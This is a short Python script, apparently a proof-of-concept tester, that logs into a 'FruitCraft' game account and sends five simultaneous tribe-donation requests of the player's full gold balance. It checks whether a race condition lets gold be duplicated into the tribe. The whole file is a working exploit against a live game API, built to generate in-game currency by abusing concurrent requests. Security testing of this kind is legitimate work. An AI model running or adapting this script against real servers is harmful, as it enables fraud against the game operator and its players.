import sys, os, time, threading
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def donate(c, amount):
    res = c.post("/tribe/donate", {"player_gold": amount})
    print(res.get("status") if res else "Fail", end=" | ")

def main():
    print("Testing Tribe Donate Race / Partial Commit...")
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    start_gold = d1["data"].get("gold", 0)
    print(f"Start Gold: {start_gold}")
    
    # We want to have some gold
    if start_gold < 100:
        c1.post("/player/withdrawfrombank", {"withdraw": 100})
        time.sleep(1)
        
    d1 = c1.get_profile()
    if not d1 or "data" not in d1: return
    gold_now = d1["data"].get("gold", 0)
    tribe_gold_start = d1["data"].get("tribe", {}).get("gold", 0)
    print(f"Prepared Gold: {gold_now}, Tribe Gold: {tribe_gold_start}")
    
    if gold_now <= 0:
        print("Not enough gold to test.")
        return
        
    amount = gold_now
    
    threads = []
    for i in range(5):
        t = threading.Thread(target=donate, args=(c1, amount))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print()
    time.sleep(2)
    
    d2 = c1.get_profile()
    gold_end = d2["data"].get("gold", 0)
    tribe_gold_end = d2["data"].get("tribe", {}).get("gold", 0)
    
    print(f"End Gold: {gold_end}, Tribe Gold: {tribe_gold_end}")
    print(f"Tribe Gained: {tribe_gold_end - tribe_gold_start}")
    print(f"Player Lost: {gold_now - gold_end}")
    
    if (tribe_gold_end - tribe_gold_start) > (gold_now - gold_end):
        print("[!!!] HIGH IMPACT: Duplicated Gold in Tribe via Race Condition!")
    else:
        print("[-] Secure. Tribe gold gain <= Player gold lost.")

if __name__ == "__main__":
    main()
